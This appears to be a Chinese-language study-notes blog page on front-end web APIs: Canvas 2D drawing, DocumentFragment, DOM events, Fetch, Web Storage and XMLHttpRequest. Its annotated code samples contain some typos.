<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 替换内容, 即支持 canvas 的浏览器将忽略容器中包含的内容, 并正常渲染 canvas --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150&quot;</span>&gt;</span></span><br><span class="line">  current stock price</span><br><span class="line"><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 记住 canvas 不可省 --&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> canvas = <span class="built_in">document</span>.getElementById(<span class="string">&quot;tutorial&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查支持性</span></span><br><span class="line"><span class="keyword">if</span> (canvas.getContext) &#123;</span><br><span class="line">  <span class="comment">// 获取渲染上下文和它的绘画功能</span></span><br><span class="line">  <span class="keyword">var</span> ctx = canvas.getContext(<span class="string">&#x27;2d&#x27;</span>); </span><br><span class="line"></span><br><span class="line">  <span class="comment">// draw code here</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// reference</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// canvas-unsupported code here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 具体的 draw code here</span></span><br><span class="line"><span class="keyword">var</span> ctx = canvas.getContext(<span class="string">&#x27;2d&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 矩形</span></span><br><span class="line">ctx.fillStyle = <span class="string">&quot;orange&quot;</span>; <span class="comment">// 更改填充颜色, 默认黑</span></span><br><span class="line">ctx.fillRect(<span class="number">25</span>, <span class="number">25</span>, <span class="number">100</span>, <span class="number">100</span>); <span class="comment">// 绘制填充的矩形</span></span><br><span class="line">ctx.clearRect(<span class="number">45</span>, <span class="number">45</span>, <span class="number">60</span>, <span class="number">60</span>); <span class="comment">// 清除指定矩形区域, 让清除部分完全透明</span></span><br><span class="line">ctx.strokeStyle = <span class="string">&quot;rgba(255, 165, 0, 1)&quot;</span> <span class="comment">// 最后一个参数为透明度, 从 0 到 1</span></span><br><span class="line">ctx.strokeRect(<span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 绘制矩形边框</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 三角形</span></span><br><span class="line">ctx.lineWidth = <span class="number">4</span>; <span class="comment">// 设置绘线的粗细</span></span><br><span class="line">ctx.lineCap = round; <span class="comment">// 设置线段端点的样式, butt(默认) / round / square</span></span><br><span class="line">ctx.lineJoin = round; <span class="comment">// 设置两条线段连接处的样式, miter(默认) / round / bevel</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这里需要另外注意 miter: 线段的外侧边缘会被延伸交汇于一点</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1. miterLimit: 设定外延交点与连接点的最大距离</span></span><br><span class="line"><span class="comment">2. 若实际交点与连接点的距离大于此值, 则 变成了bevel</span></span><br><span class="line"><span class="comment">(以下忽略)</span></span><br><span class="line"><span class="comment">3. .         .                .         .</span></span><br><span class="line"><span class="comment">    .       .                  .       .</span></span><br><span class="line"><span class="comment">     .     .                    .     .</span></span><br><span class="line"><span class="comment">      .   .                      .   .</span></span><br><span class="line"><span class="comment">       . .                        . .</span></span><br><span class="line"><span class="comment">        .      超过 limit 变成  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">ctx.beginPath(); <span class="comment">// 新建一条路径</span></span><br><span class="line">ctx.moveTo(<span class="number">75</span>, <span class="number">50</span>); <span class="comment">// 指定开始的坐标</span></span><br><span class="line">ctx.lineTo(<span class="number">100</span>, <span class="number">75</span>); <span class="comment">// 划直线</span></span><br><span class="line">ctx.lineTo(<span class="number">100</span>, <span class="number">25</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 闭合并填充, 实心</span></span><br><span class="line">ctx.fill(); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 要是不想闭合填充, 则描边呗</span></span><br><span class="line">ctx.closePath(); <span class="comment">// 绘制当前点到开始点的直线 =&gt; 闭合</span></span><br><span class="line">ctx.stroke(); <span class="comment">// 描边</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 圆弧: 整傻逼了, 画个 3/2 逆时针圆弧, 结果只出现了 1/2 逆时针圆弧, ??????</span></span><br><span class="line"><span class="comment">// 懂了, 这个 endAngle 是结束角度, 不是 该转的角度, 所以 如果是 3/2 pi, 以顺时针为默认的角度方向, 就相当于逆时针转了 pi/2</span></span><br><span class="line">ctx.arc(x, y, radius, startAngle, endAngle, anticclockwise);</span><br><span class="line"><span class="comment">// 横坐标, 纵坐标, 半径, 开始角度, 结束角度, 顺或逆时针: false / true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 二次 | 三次贝塞尔曲线</span></span><br><span class="line">ctx.quadraticCurveTo(cp1x, cp1y, x, y);</span><br><span class="line"><span class="comment">// cp1x, cp1y 为一个控制点</span></span><br><span class="line"><span class="comment">// x, y 为结束点</span></span><br><span class="line"></span><br><span class="line">ctx.bezierCurveTo(cp1x, cp1y, cp2x, cp2y, x, y);</span><br><span class="line"><span class="comment">// 两个控制点</span></span><br><span class="line"><span class="comment">// 一个结束点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. Path2D();</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Path2D();</span><br><span class="line">p1.rect(<span class="number">10</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">50</span>);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> Path2D();</span><br><span class="line">p2.arc(<span class="number">100</span>, <span class="number">35</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">2</span> * <span class="built_in">Math</span>.PI);</span><br><span class="line">ctx.stroke(p1);</span><br><span class="line">ctx.fill(p2); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 渐变色 (以下一段请忽略)</span></span><br><span class="line">       _ _ _ _ _ _   red</span><br><span class="line">      |           |         红向白渐变</span><br><span class="line">      |           |  white             </span><br><span class="line">      |           |  white</span><br><span class="line">      |           |         白向蓝渐变</span><br><span class="line">      |_ _ _ _ _ _|  blue</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> lingrad = ctx.createLinearGradient(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">150</span>); <span class="comment">// 确定渐变的方向 前二: 起点  后二: 终点</span></span><br><span class="line">lingrad.addColorStop(<span class="number">0</span>, <span class="string">&quot;red&quot;</span>);</span><br><span class="line">lingrad.addColorStop(<span class="number">0.5</span>, <span class="string">&quot;white&quot;</span>);</span><br><span class="line">lingrad.addColorStop(<span class="number">0.5</span>, <span class="string">&quot;white&quot;</span>);</span><br><span class="line">lingrad.addColorStop(<span class="number">1</span>, <span class="string">&quot;blue&quot;</span>);</span><br><span class="line">ctx.fillStyle = lingrad;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. 文字</span></span><br><span class="line">ctx.shadowOffsetX = <span class="number">2</span>; <span class="comment">// 左阴影</span></span><br><span class="line">ctx.shadowOffsetY = <span class="number">2</span>; <span class="comment">// 下阴影</span></span><br><span class="line">ctx.shadowBlur = <span class="number">2</span>; <span class="comment">// 模糊程度</span></span><br><span class="line">ctx.shadowColor = <span class="string">&quot;rgba(0, 0, 0, 0.5)&quot;</span>;</span><br><span class="line"></span><br><span class="line">ctx.font = <span class="string">&quot;20px Times New Roman&quot;</span>;</span><br><span class="line">ctx.fillStyle = <span class="string">&quot;Black&quot;</span>;</span><br><span class="line">ctx.fillText(<span class="string">&quot;Sample String&quot;</span>, <span class="number">5</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里确定了渐变的起终点, 如果绘制图形的位置不同, 在该图形发生渐变的相对位置也会不同</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. 使用图像</span></span><br><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">ctx.drawImage(img,<span class="number">0</span>,<span class="number">0</span>); <span class="comment">// img 是 image 或者 canvas 对象, x, y 是 其在目标 canvas 里的起始坐标</span></span><br><span class="line">ctx.beginPath();</span><br><span class="line">ctx.moveTo(<span class="number">30</span>,<span class="number">96</span>);</span><br><span class="line">ctx.lineTo(<span class="number">70</span>,<span class="number">66</span>);</span><br><span class="line">ctx.lineTo(<span class="number">103</span>,<span class="number">76</span>);</span><br><span class="line">ctx.lineTo(<span class="number">170</span>,<span class="number">15</span>);</span><br><span class="line">ctx.stroke();</span><br><span class="line">&#125;</span><br><span class="line">img.src = <span class="string">&#x27;https://mdn.mozillademos.org/files/5395/backdrop.png&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 版本 2</span></span><br><span class="line">ctx.drawImage(image, x, y, width, height) <span class="comment">// width 和 height 表示缩放的大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 版本 3</span></span><br><span class="line">ctx.drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight);</span><br><span class="line"><span class="comment">// sx, sy, sWidth, sHeight 关于原图像</span></span><br><span class="line"><span class="comment">// dx, dy, dWidth, dHeight 关于 canvas</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 9. 移动</span></span><br><span class="line"></span><br><span class="line">ctx.save()</span><br><span class="line">ctx.restore()  <span class="comment">// save 将 canvas 状态存储在栈中, restore 恢复原来的设定, 不是恢复原状, 而是设置的值恢复原状( fillStyle 等), 每调用一次 save 就要保存一个状态, 每调用一次 restore 就要弹出一个状态</span></span><br><span class="line"></span><br><span class="line">translate(x, y) <span class="comment">// 移动 canvas 和它的原点到一个不同的位置, 如果没有使用 save 或 restore 则可能会丢失图案</span></span><br><span class="line"></span><br><span class="line">rotate(angle) <span class="comment">// 顺时针移动 canvas 一定的角度, 同样最好配合 save 和 restore 恢复原状态</span></span><br><span class="line"></span><br><span class="line">scale(x, y) </span><br><span class="line"><span class="comment">// x: 水平缩放因子  y: 垂直缩放因子;   </span></span><br><span class="line"><span class="comment">// 参数为负数, 相当于以 x 或 y 轴 作为对称轴镜像反转</span></span><br><span class="line"></span><br><span class="line">transforms();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 10. 组合 Compositing</span></span><br><span class="line"></span><br><span class="line">globalCompositeOperation = type <span class="comment">// 后续再补充</span></span><br><span class="line"><span class="comment">// 目标图形与原图形的遮盖策略</span></span><br><span class="line"><span class="comment">// source-over 源在上</span></span><br><span class="line"><span class="comment">// destination-over 目标在上</span></span><br><span class="line">clip()</span><br><span class="line"><span class="comment">// 使用 rect() arc() 之类的方法选择绘图区域, fillRect() 方法不起作用, 且必须结合 beginPath() 使用, clip() 将选择最近的 rect 作为绘图区域</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 11. 动画 --- 以画小球为例</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> raf = <span class="built_in">window</span>.requestAnimationFrame(funciton);</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.cancelAnimationFrame(raf)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 12. 像素操作</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>




<h5 id="其他-API"><a href="#其他-API" class="headerlink" title="其他 API"></a>其他 <code>API</code></h5><ul>
<li><p><code>DocumentFragment</code></p>
<blockquote>
<ol>
<li><strong>文档片段</strong>接口, 一个没有父对象的最小文档对象;<blockquote>
</blockquote>
</li>
<li>轻量版的 <code>Document</code>, 存储由节点(nodes)组成的文档结构;<blockquote>
</blockquote>
</li>
<li>与 document 相比, DocumentFragment 不是真实 Dom 树的一部分, 它的变化不会触发 Dom 树 <strong>重新渲染</strong>, 不会导致性能问题<blockquote>
</blockquote>
</li>
<li>总结: DocumentFragment 相当于一个 <strong>隐形</strong> 的容器, 正常情况下, ul 每添加一个 li 页面就要更新一次, 也就是说添加 5 个 li, 回流 5 次, 但是利用 DocumentFragment 先将 5 个 li 添加到 fragment 上, 在此之前页面不会更新, 最后统一添加到 Dom 树上, 但是并不是 DocumentFragment 引起 树的变化, 而是其上的所有子节点, 回流一次;</li>
</ol>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;fragment_test&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>test1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>test2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>test3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">const</span> ul = <span class="built_in">document</span>.getElementById(<span class="string">&quot;fragment_test&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> fragment = <span class="built_in">document</span>.creaetDocumentFragment();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> child;</span><br><span class="line">  <span class="keyword">while</span>(child = ul.firstChild) &#123;</span><br><span class="line">    fragment.appendChild(child);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Array</span>.prototype.slice.call(fragment.childNodes).forEach(<span class="function">(<span class="params">node</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(node === <span class="number">1</span>)</span><br><span class="line">      node.textContent = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  ul.appendChild(fragment);</span><br><span class="line"></span><br><span class="line">* <span class="string">`Node`</span></span><br><span class="line">  <span class="number">1.</span> 接口, <span class="string">`Document`</span> <span class="string">`Element`</span> <span class="string">`Attr`</span> <span class="string">`CharacterDate`</span>( include <span class="string">`Text`</span> <span class="string">`Comment`</span> <span class="string">`CDATASection`</span>) <span class="string">`ProcessingInstruction`</span> <span class="string">`DocumentFragment`</span> <span class="string">`DocumentType`</span> <span class="string">`Notation`</span> <span class="string">`Entity`</span> <span class="string">`EntityReference`</span> 从这个接口继承</span><br><span class="line"></span><br><span class="line">  <span class="number">2.</span> 一些属性和方法</span><br><span class="line">  * <span class="string">`Node.childNodes`</span>: 该节点的所有子节点</span><br><span class="line">  * <span class="string">`Node.firstChild`</span>: 第一个子节点</span><br><span class="line">  * <span class="string">`Nod.e.nodeType`</span>: 与该节点对应的值</span><br><span class="line">  * <span class="string">`Node.textContent`</span>: 一个元素内的所有子节点及其后代的文本内容</span><br><span class="line">  * <span class="string">`Node.appendChild`</span>: 将节点从原来位置剥离, 放置到现在的位置</span><br><span class="line">  * <span class="string">`Node.className`</span>: 返回字符串, <span class="class"><span class="keyword">class</span> 属性值, 由空格分隔</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">* `<span class="title">DOM</span>`</span></span><br><span class="line">  1. `EventTarget`: 接收事件, 创建侦听器</span><br><span class="line">    * <span class="string">`addEventListener(type, listener, useCapture)`</span></span><br><span class="line">      type: 监听事件类型的字符串</span><br><span class="line">      listener: 回调函数</span><br><span class="line">      useCapture: 当嵌套元素与其父元素同时注册了监听器, 事件传播方式</span><br><span class="line"></span><br><span class="line">        &gt; <span class="number">1.</span> 两种方式: <span class="string">`event capturing`</span> / <span class="string">`event bubbing`</span></span><br><span class="line">        &gt;&gt;</span><br><span class="line">        &gt; <span class="number">2.</span> <span class="string">`W3C model`</span> 使用: 先向下( <span class="string">`capture`</span> -捕获), 若 <span class="string">`useCapture`</span> 为 <span class="string">`true`</span>, 首先触发执行, 到达 <span class="string">`target`</span> 后, 不管 <span class="string">`useCapture`</span> 是啥, 触发执行, 随后向上( <span class="string">`bubble`</span> -冒泡), 若 <span class="string">`useCapture`</span> 为 <span class="string">`false`</span>, 触发执行</span><br><span class="line">        &gt;&gt;</span><br><span class="line">        &gt; <span class="number">3.</span> 在 <span class="string">`W3C`</span> 中, <span class="string">`useCapture`</span> 默认为 <span class="string">`false`</span>: 冒泡, <span class="string">`true`</span>: 捕获</span><br><span class="line">        &gt;&gt;</span><br><span class="line">        &gt; <span class="number">4.</span> [Please Visit site <span class="keyword">for</span> more information]([ht](https:<span class="comment">//www.runoob.com/markdown/md-link.html))</span></span><br><span class="line">        &gt;&gt;</span><br><span class="line">        &gt; <span class="number">5.</span> 使用 <span class="string">`event.stopPropagation()`</span> 阻止事件的传播, 使用 <span class="string">`event.stopImmediatePropagation()`</span> 阻止后面所有的监听函数</span><br><span class="line"></span><br><span class="line">* <span class="string">`Fetch_API`</span>: 获取资源接口(包括跨域请求)</span><br><span class="line">  * <span class="string">`Fetch(url)`</span></span><br><span class="line">    &gt; <span class="number">1.</span> 必须接受一个参数 -- 资源的路径(<span class="string">`url`</span>)</span><br><span class="line">    &gt;&gt;</span><br><span class="line">    &gt; <span class="number">2.</span> 无论请求成功与否, 它都返回一个 <span class="built_in">Promise</span> 对象, <span class="string">`resolve`</span> 对应请求的 <span class="string">`Response`</span></span><br><span class="line">    &gt;&gt;</span><br><span class="line">    &gt; <span class="number">3.</span> <span class="string">`fetch`</span> 与 <span class="string">`jQuery.ajax()`</span> 的不同</span><br><span class="line">    &gt;&gt;</span><br><span class="line">    &gt;&gt; * 接收到代表错误的 HTTP 状态码时, 从 <span class="string">`fetch()`</span> 返回的 <span class="string">`Promise`</span> **不会被标记为 <span class="string">`reject`</span>**, 即使状态码是 <span class="number">404</span> 或 <span class="number">500.</span> 相反它会将 <span class="string">`Promise`</span> 状态标记为 <span class="string">`resolve`</span> (但是会将 <span class="string">`resolve`</span> 的返回值的 <span class="string">`ok`</span> 属性设置为 <span class="string">`false`</span>), 仅当网络故障时或请求被阻止时, 才会标记为 <span class="string">`reject`</span></span><br><span class="line">    &gt;&gt;</span><br><span class="line">    &gt;&gt; * <span class="string">`fetch()`</span> 可以接受跨域 <span class="string">`cookies`</span>, 可以使用 <span class="string">`fetch()`</span> 建立起跨域对话</span><br><span class="line">    &gt;&gt;</span><br><span class="line">    &gt;&gt; * <span class="string">`fetch()`</span> 不会发送 <span class="string">`cookies`</span></span><br><span class="line">    &gt;&gt;</span><br><span class="line">    &gt; <span class="number">4.</span> <span class="string">`Response`</span> 对象</span><br><span class="line">    &gt;&gt;</span><br><span class="line">    &gt;&gt; * <span class="string">`Response.status`</span>: 整数, 状态码</span><br><span class="line">    &gt;&gt;</span><br><span class="line">    &gt;&gt; * <span class="string">`Response.statusText`</span>: 字符串, 状态码消息</span><br><span class="line">    &gt;&gt;</span><br><span class="line">    &gt;&gt; * <span class="string">`Response.ok`</span>: 是否在 <span class="number">200</span>-<span class="number">299</span> 内</span><br><span class="line">  </span><br><span class="line">  <span class="string">``</span><span class="string">`js</span></span><br><span class="line"><span class="string">  // 基本的 fetch 请求</span></span><br><span class="line"><span class="string">  // 这里需要解决的问题:</span></span><br><span class="line"><span class="string">  // 1. 怎么跨域请求</span></span><br><span class="line"><span class="string">  // 2. 是什么导致 reponse.json() 意外终止</span></span><br><span class="line"><span class="string">  fetch(&#x27;http://example.com/movies.json&#x27;)</span></span><br><span class="line"><span class="string">    .then(function(reponse) &#123;</span></span><br><span class="line"><span class="string">      return reponse.json();</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    .then(function(myJson) &#123;</span></span><br><span class="line"><span class="string">      console.log(myJson);</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接收第二个可选参数</span></span><br><span class="line">fetch(<span class="string">&#x27;http://example.com/answer&#x27;</span>, &#123;</span><br><span class="line">  body: <span class="built_in">JSON</span>.stringify(&#123;<span class="attr">answer</span>: <span class="number">42</span>&#125;),</span><br><span class="line">  cache: <span class="string">&#x27;no-cache&#x27;</span>, <span class="comment">// default, no-cache, reload, force-cache, only-if-cached</span></span><br><span class="line">  credentials: <span class="string">&#x27;same-origin&#x27;</span>, <span class="comment">// 发送凭据, 为了在当前域名内自动发送 cookie, 有 include/omit/same-origin</span></span><br><span class="line">  headers: &#123;</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 MDN Example&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">  &#125;, <span class="comment">// 头信息</span></span><br><span class="line">  method: <span class="string">&#x27;POST&#x27;</span>, <span class="comment">// 使用的请求方法</span></span><br><span class="line">  mode: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">  redirect: <span class="string">&#x27;follow&#x27;</span>, <span class="comment">// follow: 自动重定向  error: 如果产生重定向则自动终止并抛出错误  manual: 手动处理重定向</span></span><br><span class="line">  referrer: <span class="string">&#x27;no-referrer&#x27;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">reponse</span> =&gt;</span> reponse.json())</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 上传 JSON 数据</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;https://api.douban.com/v2/movie/top250&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> data = &#123;<span class="attr">username</span>: <span class="string">&#x27;example&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">fetch(url, &#123;</span><br><span class="line">  method: <span class="string">&#x27;POST&#x27;</span>, </span><br><span class="line">  body: <span class="built_in">JSON</span>.stringfy(data),</span><br><span class="line">  headers: <span class="keyword">new</span> Header(&#123;</span><br><span class="line">    <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">  &#125;),</span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> res.json())</span><br><span class="line">.catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;Error&#x27;</span>, error))</span><br><span class="line">.then(<span class="function"><span class="params">reponse</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;Success&#x27;</span>, response));</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 上传文件, &lt;input type=&quot;file&quot; /&gt;</span></span><br><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> FormData();</span><br><span class="line"><span class="keyword">var</span> fileField = <span class="built_in">document</span>.querySelector(<span class="string">&quot;input[type=&#x27;file&#x27;]&quot;</span>);</span><br><span class="line"></span><br><span class="line">formData.append(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;abc123&#x27;</span>);</span><br><span class="line"><span class="comment">// 如果上传多个文件, 则在此处使用 for 循环</span></span><br><span class="line">formData.append(<span class="string">&#x27;avatar&#x27;</span>, fileField.files[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&#x27;https://example.com/profile/avatar&#x27;</span>, &#123;</span><br><span class="line">  method: <span class="string">&#x27;PUT&#x27;</span>,</span><br><span class="line">  body: formData</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">res</span> =&gt;</span> res.json())</span><br><span class="line">.then(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">console</span>.log(response));</span><br></pre></td></tr></table></figure></li>
<li><p><code>Storage</code></p>
<ol>
<li><p><code>Window.localStorage</code></p>
<blockquote>
<p>提供访问 <strong>本地存储</strong> 的功能 – 无过期时间设置</p>
</blockquote>
<ul>
<li><p><code>localStorage.setItem(&#39;bgcolor&#39;, &#39;red&#39;)</code>: 将 <code>键名-键值</code> 添加到存储中</p>
</li>
<li><p><code>localStorage.getItem(&#39;bgcolor&#39;)</code>: 获取 对应<strong>键名的键值</strong>, 没有返回 <code>null</code></p>
</li>
<li><p><code>localStorage.removeItem(&#39;bgcolor&#39;)</code></p>
</li>
<li><p><code>localStorage.clear()</code></p>
</li>
<li><p><code>localStorage.key(n)</code>: 根据索引返回 <strong>键名</strong></p>
</li>
</ul>
</li>
<li><p><code>Window.sessionStorage</code></p>
<blockquote>
<p> <strong>特定域名下的会话存储</strong> – 会话结束会被清除</p>
<blockquote>
</blockquote>
<ol>
<li>相同 url 的多个窗口, 各自创建 sessionStorage<blockquote>
</blockquote>
</li>
<li>页面打开期间会话一直保持, 重新加载或恢复都会保持原来的会话<blockquote>
</blockquote>
</li>
<li>关闭页面, sessionStorage 清除</li>
</ol>
</blockquote>
<ul>
<li><code>setItem</code> | <code>getItem</code> | <code>removeItem</code> | <code>clear</code></li>
</ul>
</li>
</ol>
</li>
<li><p><code>XMLHttpRequest</code></p>
<blockquote>
<p>用于与服务器交互, 通过 <code>XMLHttpRequest</code> 可以在不刷新页面的情况下请求特定的 <code>url</code>, 获取数据 —- <code>更新页面的局部内容</code></p>
<blockquote>
</blockquote>
<p>步骤如下:</p>
</blockquote>
<ol>
<li><p>创建 <code>XMLHttpRequest</code> 实例</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br></pre></td></tr></table></figure></li>
<li><p>建立 <code>HTTP</code> 连接</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 请求方式: GET / POST / PUT</span></span><br><span class="line"><span class="comment">// 2. URL</span></span><br><span class="line"><span class="comment">// 3. 是否异步 (true: yes)</span></span><br><span class="line"><span class="comment">// 请求方式为 GET, 参数放在 url 后</span></span><br><span class="line"><span class="comment">// 请求方式为 POST, 参数放在 send() 函数内</span></span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://www.example.com/?id=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(id), <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置 请求头信息</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>发送请求</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET</span></span><br><span class="line">xhr.send(<span class="literal">null</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// POST</span></span><br><span class="line"><span class="keyword">var</span> data = <span class="string">&#x27;email=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(email) + <span class="string">&#x27;&amp;password=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(password);</span><br><span class="line"></span><br><span class="line">xhr.send(data);</span><br></pre></td></tr></table></figure>
</li>
<li><p>监听通信状态 <code>readyState</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// readyState</span></span><br><span class="line">  <span class="comment">// 0: 实例生成, open()方法还没有调用</span></span><br><span class="line">  <span class="comment">// 1: open()方法调用, send()方法为调用</span></span><br><span class="line">  <span class="comment">// 2： send()方法调用, 服务器返回的头信息和状态码都已经收到</span></span><br><span class="line">  <span class="comment">// 3: 正在接收数据</span></span><br><span class="line">  <span class="comment">// 4: 接收数据完成 或 接收失败</span></span><br><span class="line">   <span class="keyword">if</span>(xhr.readyState ==- <span class="number">4</span>) &#123;</span><br><span class="line">     <span class="comment">// 200 表示通信正常</span></span><br><span class="line">     <span class="comment">// 304 表示数据未修改</span></span><br><span class="line">     <span class="keyword">if</span>(xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">       <span class="built_in">console</span>.log(xhr.responseText); <span class="comment">// 字符串</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       <span class="built_in">console</span>.log(xhr.statusText);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xhr.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(xhr.statusText);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li><code>XMLHttpRequest.reponse</code> – 表示服务器返回的数据体, 可以是任何数据类型: 字符串、对象、二进制对象</li>
<li><code>XMLHttpRequest.reponseType</code> – 决定返回的数据类型<blockquote>
<p>“”: 等同于 <code>text</code><br>“arraybuffer”: <code>ArrayBuffer</code> 对象, 表示服务器返回二进制数组<br>“blob”: <code>Blob</code> 对象, 服务器返回二进制对象<br>“document”: <code>Document</code> 对象, 返回一个文档对象<br>“json”: <code>JSON</code> 对象<br>“text”: 字符串</p>
</blockquote>
</li>
